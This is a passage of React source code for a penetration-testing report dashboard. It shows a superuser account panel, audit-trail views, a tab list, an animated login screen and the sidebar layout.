      <div className="mb-6">
        <div className="flex items-center justify-between mb-2">
          <div className="text-sm font-bold text-gray-300">Report Versioning — Current: <span className="text-cyan-400 font-mono">{data.versionNum}</span></div>
          <div className="flex gap-2">
            <button onClick={()=>bumpVersion("minor")} className="text-xs bg-gray-700 hover:bg-gray-600 text-white px-2 py-1 rounded font-semibold">+ Minor (v1.1)</button>
            <button onClick={()=>bumpVersion("major")} className="text-xs bg-indigo-700 hover:bg-indigo-600 text-white px-2 py-1 rounded font-semibold">+ Major (v2.0)</button>
          </div>
        </div>
        {data.versionHistory.length>0 && (
          <div className="bg-gray-950 border border-gray-800 rounded-lg p-2 max-h-32 overflow-y-auto">
            {data.versionHistory.map((v,i)=><div key={i} className="text-xs text-gray-500 py-0.5">{v.ver} — {v.stage} — {v.date}</div>)}
          </div>
        )}
      </div>

      {/* System Login Accounts — superuser only */}
      {authUser.role==="superuser" && (
        <div className="mb-6">
          <div className="flex items-center justify-between mb-2">
            <div className="text-sm font-bold text-gray-300">🔑 Password Manager — User Accounts &amp; Permissions</div>
            <div className="flex gap-2">
              <button onClick={exportDB} className="text-xs bg-gray-700 hover:bg-gray-600 text-white px-2 py-1 rounded font-semibold">📥 Export DB (.json)</button>
              <label className="text-xs bg-gray-700 hover:bg-gray-600 text-white px-2 py-1 rounded font-semibold cursor-pointer">📤 Import DB
                <input type="file" accept=".json" className="hidden" onChange={e=>{ const f=e.target.files[0]; if(f) importDB(f); e.target.value=""; }}/>
              </label>
              <button onClick={addSysUser} className="text-xs bg-indigo-700 hover:bg-indigo-600 text-white px-2 py-1 rounded font-semibold">+ Add User</button>
            </div>
          </div>
          {sysUsers.map(u=>(
            <div key={u._id} className="flex items-center gap-2 bg-gray-900 border border-gray-800 rounded-lg p-3 mb-2">
              <input className="flex-1 bg-gray-800 border-2 border-gray-700 text-gray-100 rounded-lg px-3 py-2.5 text-base focus:outline-none focus:border-cyan-500" placeholder="Username" value={u.username} onChange={e=>updSysUser(u._id,"username",e.target.value)}/>
              <input type="text" className="flex-1 bg-gray-800 border-2 border-gray-700 text-gray-100 rounded-lg px-3 py-2.5 text-base font-mono focus:outline-none focus:border-cyan-500" placeholder="Password" value={u.password} onChange={e=>updSysUser(u._id,"password",e.target.value)}/>
              <select className={S+" w-56 py-2.5 text-base"} value={u.role} onChange={e=>updSysUser(u._id,"role",e.target.value)}>
                {AUTH_ROLES.map(r=><option key={r} value={r}>{AUTH_ROLE_LABEL[r]}</option>)}
              </select>
              <button onClick={()=>delSysUser(u._id)} className="text-red-500 hover:text-red-400 font-bold px-2 text-lg">×</button>
            </div>
          ))}
          <div className="text-xs text-gray-600 mt-2">Permissions — <b className="text-gray-400">user</b>: view/download reports only. <b className="text-gray-400">admin</b>: full report editing, no audit access. <b className="text-gray-400">superuser</b>: everything + this panel + audit trail.</div>
        </div>
      )}

      {/* Audit Trail — superuser only */}
      {authUser.role==="superuser" ? (
        <div>
          <div className="text-sm font-bold text-gray-300 mb-2">🕵 System Audit Trail (logins, permissions, deletions)</div>
          <div className="bg-gray-950 border border-gray-800 rounded-lg p-2 max-h-56 overflow-y-auto mb-4">
            {sysAudit.length===0 && <div className="text-center text-gray-700 text-xs py-4">No system events logged yet.</div>}
            {sysAudit.map(a=>(
              <div key={a._id} className="text-xs text-gray-400 py-1 border-b border-gray-900 last:border-0"><span className="text-gray-600">{a.ts}</span> — <span className="text-orange-400">{a.user}</span>: {a.action}</div>
            ))}
          </div>
          <div className="text-sm font-bold text-gray-300 mb-2">Report Audit Trail (this report's edits)</div>
          <div className="bg-gray-950 border border-gray-800 rounded-lg p-2 max-h-56 overflow-y-auto">
            {data.auditLog.length===0 && <div className="text-center text-gray-700 text-xs py-4">No actions logged yet.</div>}
            {data.auditLog.map(a=>(
              <div key={a._id} className="text-xs text-gray-400 py-1 border-b border-gray-900 last:border-0"><span className="text-gray-600">{a.ts}</span> — <span className="text-cyan-500">{a.user}</span>: {a.action}</div>
            ))}
          </div>
        </div>
      ) : (
        <div className="text-center text-gray-700 text-xs py-6 border-2 border-dashed border-gray-800 rounded-lg">🔒 Audit Trail is restricted to Super User accounts.</div>
      )}
    </div>
  );

  const ALL_TABS = [
    {id:"cover",    icon:"📋", label:"Cover Page"},
    {id:"scope",    icon:"🎯", label:"Scope & Assets"},
    {id:"findings", icon:"🔍", label:"Findings", badge:data.findings.length},
    {id:"import",   icon:"📥", label:"Scanner Import"},
    {id:"tracker",  icon:"📊", label:"Tracker"},
    {id:"sla",      icon:"⏱", label:"SLA Tracking"},
    {id:"roadmap",  icon:"🗺️", label:"Roadmap"},
    {id:"conclusion",icon:"✅",label:"Conclusion"},
    {id:"pdfset",   icon:"🎨", label:"PDF Settings"},
    {id:"analytics",icon:"📊", label:"Analytics"},
    {id:"compliance",icon:"📜",label:"Compliance"},
    {id:"team",     icon:"👥", label:"Team & Audit"},
    {id:"history",  icon:"📂", label:"History", badge:history.length},
  ];
  // Role gating: "user" => only History (view/download). "admin"/"superuser" => everything (Team tab self-filters audit section).
  const TABS = authUser?.role==="user" ? ALL_TABS.filter(t=>t.id==="history") : ALL_TABS;
  const RENDERS = { cover:TabCover, scope:TabScope, findings:TabFindings, import:TabImport, tracker:TabTracker, sla:TabSLA, roadmap:TabRoadmap, conclusion:TabConclusion, pdfset:TabPDFSettings, analytics:TabAnalytics, compliance:TabCompliance, team:TabTeam, history:TabHistory };

  // ── LOGIN SCREEN ─────────────────────────────────────────────────────────
  const LoginScreen = () => (
    <div className="flex h-screen bg-gray-950 items-center justify-center relative overflow-hidden"
      onMouseMove={e=>{ const t=e.currentTarget; t.style.setProperty("--mx",e.clientX+"px"); t.style.setProperty("--my",e.clientY+"px"); }}>
      <style>{`
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulseGlow{0%,100%{filter:drop-shadow(0 0 0px #00D4FF)}50%{filter:drop-shadow(0 0 10px #00D4FF)}}
@keyframes blob1{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(60px,40px) scale(1.15)}}
@keyframes blob2{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-50px,-30px) scale(1.1)}}
@keyframes flowCurrent{to{stroke-dashoffset:-200}}
@keyframes nodePulse{0%,100%{opacity:.3;r:2}50%{opacity:1;r:3.5}}
`}</style>
      {/* Cursor-tracked electric spotlight */}
      <div className="absolute inset-0 pointer-events-none transition-opacity" style={{background:"radial-gradient(circle 280px at var(--mx,50%) var(--my,50%), rgba(0,212,255,0.12), transparent 70%)"}}/>
      <div className="absolute -top-32 -left-32 w-96 h-96 bg-cyan-700/20 rounded-full blur-3xl" style={{animation:"blob1 9s ease-in-out infinite"}}/>
      <div className="absolute -bottom-32 -right-20 w-96 h-96 bg-blue-700/20 rounded-full blur-3xl" style={{animation:"blob2 11s ease-in-out infinite"}}/>
      {/* Circuit board — current flowing through traces */}
      <svg className="absolute inset-0 w-full h-full pointer-events-none" style={{opacity:0.5}}>
        {[
          "M0,80 H180 V200 H400",
          "M0,500 H150 V380 H350 V480 H650",
          "M650,60 H480 V180 H300",
          "M650,560 H500 V440 H250",
          "M50,0 V120 H220 V260",
          "M600,620 V480 H420 V340",
        ].map((d,i)=>(
          <g key={i}>
            <path d={d} fill="none" stroke="#0E3A4A" strokeWidth="1.5"/>
            <path d={d} fill="none" stroke="#00D4FF" strokeWidth="1.5" strokeDasharray="6 14"
              style={{animation:`flowCurrent ${2.5+i*0.4}s linear infinite`}}/>
          </g>
        ))}
        {[[180,80],[400,200],[150,500],[350,380],[480,60],[300,180],[500,560],[250,440],[220,0],[420,340]].map(([x,y],i)=>(
          <circle key={i} cx={x} cy={y} r="3" fill="#00D4FF" style={{animation:`nodePulse ${1.8+i*0.2}s ease-in-out infinite`}}/>
        ))}
      </svg>
      <div className="bg-gray-900 border border-gray-800 rounded-2xl p-7 w-full max-w-sm shadow-2xl animate-[fadeIn_0.4s_ease-out] relative z-10">
        <div className="text-center mb-6">
          <div className="text-4xl mb-2" style={{animation:"pulseGlow 2.5s ease-in-out infinite"}}>🛡</div>
          <div className="text-cyan-400 font-black text-lg tracking-wider">VAPT REPORT</div>
          <div className="text-gray-600 text-xs mt-1">Created by Sidharth Mittal</div>
          <div className="text-gray-500 text-xs mt-1.5">Sign in to continue</div>
        </div>
        <label className="block text-xs text-gray-400 font-semibold uppercase tracking-wider mb-1.5">Username</label>
        <input className="w-full bg-gray-800 border-2 border-gray-700 text-gray-100 rounded-lg px-3 py-2.5 text-sm mb-4 focus:outline-none focus:border-cyan-500 focus:scale-[1.01] transition-all" value={loginForm.username} onChange={e=>setLoginForm(f=>({...f,username:e.target.value,error:""}))} onKeyDown={e=>e.key==="Enter"&&doLogin()}/>
        <label className="block text-xs text-gray-400 font-semibold uppercase tracking-wider mb-1.5">Password</label>
        <input type="password" className="w-full bg-gray-800 border-2 border-gray-700 text-gray-100 rounded-lg px-3 py-2.5 text-sm mb-4 focus:outline-none focus:border-cyan-500 focus:scale-[1.01] transition-all" value={loginForm.password} onChange={e=>setLoginForm(f=>({...f,password:e.target.value,error:""}))} onKeyDown={e=>e.key==="Enter"&&doLogin()}/>
        {loginForm.error && <div className="text-red-400 text-xs mb-3 animate-[fadeIn_0.2s_ease-out]">{loginForm.error}</div>}
        <button onClick={doLogin} className="w-full bg-cyan-700 hover:bg-cyan-600 active:scale-[0.98] hover:shadow-lg hover:shadow-cyan-900/50 text-white font-bold py-2.5 rounded-lg text-sm transition-all">Login</button>
      </div>
    </div>
  );

  // ── MAIN RENDER ──────────────────────────────────────────────────────────
  if (!authUser) return LoginScreen();
  return (
    <div className="flex h-screen bg-gray-950 text-white overflow-hidden">
      <style>{`
@keyframes slideIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
@keyframes fadeIn2{from{opacity:0}to{opacity:1}}
@keyframes riseIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulseGlow{0%,100%{filter:drop-shadow(0 0 0px #00D4FF)}50%{filter:drop-shadow(0 0 8px #00D4FF)}}
@keyframes riskPop{0%{transform:scale(0.85);opacity:0}60%{transform:scale(1.05)}100%{transform:scale(1);opacity:1}}
.main-content > * { animation: fadeIn2 0.3s ease-out both; }
.main-content > div > * { animation: riseIn 0.35s ease-out both; }
.main-content > div > *:nth-child(1){animation-delay:.02s} .main-content > div > *:nth-child(2){animation-delay:.07s}
.main-content > div > *:nth-child(3){animation-delay:.12s} .main-content > div > *:nth-child(4){animation-delay:.17s}
.main-content > div > *:nth-child(5){animation-delay:.22s} .main-content > div > *:nth-child(6){animation-delay:.27s}
.main-content > div > *:nth-child(n+7){animation-delay:.32s}
.main-content table tbody tr{animation:riseIn .3s ease-out both}
.main-content .grid > *{animation:riseIn .35s ease-out both}
`}</style>
      {/* Toast */}
      {toast.msg && (
        <div className={"fixed top-4 right-4 z-[60] px-4 py-3 rounded-lg shadow-2xl text-sm font-semibold border animate-[slideIn_0.25s_ease-out] "+(toast.type==="success"?"bg-green-900 border-green-600 text-green-200":toast.type==="error"?"bg-red-900 border-red-600 text-red-200":"bg-cyan-900 border-cyan-600 text-cyan-200")}>
          {toast.msg}
        </div>
      )}
      {/* Lightbox */}
      {lightbox && <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4 cursor-pointer animate-[fadeIn2_0.2s_ease-out]" onClick={()=>setLightbox(null)}><img src={lightbox} className="max-w-full max-h-full rounded-lg border border-gray-600 shadow-2xl"/><div className="absolute top-4 right-4 text-gray-400 text-2xl font-bold">×</div></div>}
      {/* Library Modal */}
      {libModal.open && LibModal()}
      {/* AI Panel */}
      {aiPanel.open && AIPanel()}

      {/* ── SIDEBAR ──────────────────────────────────────────────────── */}
      <aside className="w-52 bg-gray-900 border-r border-gray-800 flex flex-col shrink-0">
        <div className="p-3 border-b border-gray-800">
          <div className="flex items-center gap-2">
            <span className="text-xl" style={{animation:"pulseGlow 2.5s ease-in-out infinite"}}>🛡</span>
            <div><div className="text-cyan-400 font-black text-sm tracking-wider">VAPT PRO</div><div className="text-gray-600 text-xs">Report Dashboard</div></div>
          </div>
          <div className="flex items-center justify-between mt-2 pt-2 border-t border-gray-800">
            <div className="text-xs">
              <div className="text-gray-300 font-semibold">{authUser.username}</div>
              <div className="text-gray-600">{authUser.role}</div>
            </div>
            <button onClick={doLogout} className="text-xs bg-gray-800 hover:bg-red-900 text-gray-400 hover:text-red-300 px-2 py-1 rounded font-semibold">Logout</button>
          </div>
        </div>
        <nav className="flex-1 p-2 overflow-y-auto">
          {TABS.map(t=>(
            <button key={t.id} onClick={()=>setTab(t.id)} className={"w-full text-left px-3 py-2 rounded-lg text-sm mb-0.5 flex items-center gap-2 transition-all hover:translate-x-0.5 "+(tab===t.id?"bg-cyan-950 text-cyan-300 font-semibold border border-cyan-900":"text-gray-400 hover:bg-gray-800 hover:text-gray-200")}>
              <span className="shrink-0">{t.icon}</span>
              <span className="flex-1 text-xs">{t.label}</span>
              {t.badge>0 && <span className={"text-xs px-1.5 py-0.5 rounded-full font-bold "+(tab===t.id?"bg-cyan-800 text-cyan-200":"bg-gray-700 text-gray-400")}>{t.badge}</span>}
            </button>
          ))}
        </nav>
        {/* Risk summary */}
        <div className="p-3 border-t border-gray-800">
          <div className="text-xs text-gray-600 uppercase tracking-wider font-semibold mb-2">Risk Summary</div>
          <div className="grid grid-cols-2 gap-1">
            {[["C",sevCount.Critical,"#FF1744","#33000A"],["H",sevCount.High,"#FF6D00","#331500"],["M",sevCount.Medium,"#FFD600","#2A2500"],["L",sevCount.Low,"#00E676","#00220F"]].map(([s,c,col,bg],i)=>(
              <div key={s} className="text-center p-1.5 rounded hover:scale-105 transition-transform" style={{background:bg,animation:`riskPop 0.4s ease-out ${i*0.08}s both`}}>
                <div className="font-black text-sm" style={{color:col}}>{c}</div>
                <div className="text-xs font-bold" style={{color:col,opacity:0.8}}>{s}</div>
              </div>
            ))}
          </div>
        </div>
        {/* Buttons */}
        <div className="p-3 border-t border-gray-800 space-y-2">
          {authUser.role!=="user" && <button onClick={saveCurrentReport} className="w-full bg-gray-700 hover:bg-gray-600 hover:-translate-y-0.5 active:translate-y-0 hover:shadow-lg text-white font-bold py-2 rounded-lg text-xs flex items-center justify-center gap-1.5 transition-all">💾 Save Report</button>}
          {authUser.role!=="user" && <button onClick={exportXLSX} className="w-full bg-green-800 hover:bg-green-700 hover:-translate-y-0.5 active:translate-y-0 hover:shadow-lg hover:shadow-green-900/40 text-white font-bold py-2 rounded-lg text-xs flex items-center justify-center gap-1.5 transition-all">📊 Export XLSX</button>}
          <button onClick={exportPDF} disabled={exporting} className={"w-full font-bold py-2.5 rounded-lg text-xs flex items-center justify-center gap-1.5 transition-all "+(exporting?"bg-gray-700 text-gray-400 cursor-not-allowed":"bg-gradient-to-r from-cyan-700 to-blue-700 hover:from-cyan-600 hover:to-blue-600 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-cyan-900/40 active:translate-y-0 text-white")}>
            {exporting ? <><span className="animate-spin">⟳</span> {exportMsg||"Generating..."}</> : <>⬇ Export PDF</>}
          </button>
          {exporting&&exportMsg && <div className="text-xs text-cyan-600 text-center animate-pulse leading-tight">{exportMsg}</div>}
          {!exporting && authUser.role!=="user" && <div className="text-xs text-gray-600 text-center mt-0.5">Click Save to keep changes in History</div>}
        </div>
      </aside>

      {/* ── MAIN CONTENT ────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <header className="h-12 bg-gray-900 border-b border-gray-800 flex items-center px-5 gap-3 shrink-0">
          <input className="bg-transparent text-white font-semibold text-sm focus:outline-none flex-1 max-w-sm placeholder-gray-600 border-b border-transparent hover:border-gray-700 focus:border-cyan-600 py-0.5" placeholder="Organisation name..." value={data.cover.org||""} onChange={e=>updCov("org",e.target.value)}/>
          <div className="flex items-center gap-2 text-xs text-gray-500 ml-auto">
            <span className={"px-2 py-0.5 rounded font-semibold "+(data.cover.classification==="CONFIDENTIAL"?"bg-red-900/50 text-red-400":"bg-gray-800 text-gray-400")}>{data.cover.classification||"CONFIDENTIAL"}</span>
            <span className="text-gray-600">|</span>
            <span>{THEME_NAMES[data.themeId]||"Dark Cyber"}</span>
            <span className="text-gray-600">|</span>
            <span>{data.findings.length} findings</span>
          </div>
          <button onClick={()=>openAI("execSummary")} className="bg-purple-900 hover:bg-purple-800 text-purple-300 text-xs px-3 py-1.5 rounded font-semibold">✨ AI Write</button>
          <button onClick={exportPDF} disabled={exporting} className={"text-xs px-3 py-1.5 rounded font-semibold "+(exporting?"bg-gray-700 text-gray-400":"bg-cyan-700 hover:bg-cyan-600 text-white")}>
            {exporting ? "⟳ Generating..." : "⬇ Export PDF"}
          </button>
        </header>
        <main className="flex-1 overflow-y-auto">
          <div key={tab} className="main-content p-6 max-w-4xl mx-auto">{RENDERS[tab]?.()}</div>
        </main>
      </div>
    </div>
  );
}
